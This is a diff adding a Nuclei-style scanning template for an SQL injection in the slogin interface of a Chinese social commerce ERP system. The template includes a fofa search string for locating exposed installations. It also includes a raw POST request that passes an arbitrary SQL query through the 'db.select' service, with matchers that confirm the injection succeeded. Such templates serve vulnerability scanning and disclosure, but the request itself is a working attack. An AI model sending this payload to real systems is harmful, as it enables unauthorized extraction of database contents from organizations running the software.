@@ -1,0 +1,27 @@
+id: yunshikong-sql-injection
+
+info:
+  name: 云时空社会化商业ERP系统 slogin SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="云时空社会化商业ERP系统"
+        云时空社会化商业ERP系统 slogin 接口被发现存在SQL注入漏洞，攻击者可利用该漏洞提取数据库中的敏感信息。
+  tags: 云时空社会化商业ERP系统
+
+http:
+- raw:
+  - |
+    POST /slogin/service?service=db.select HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'values'
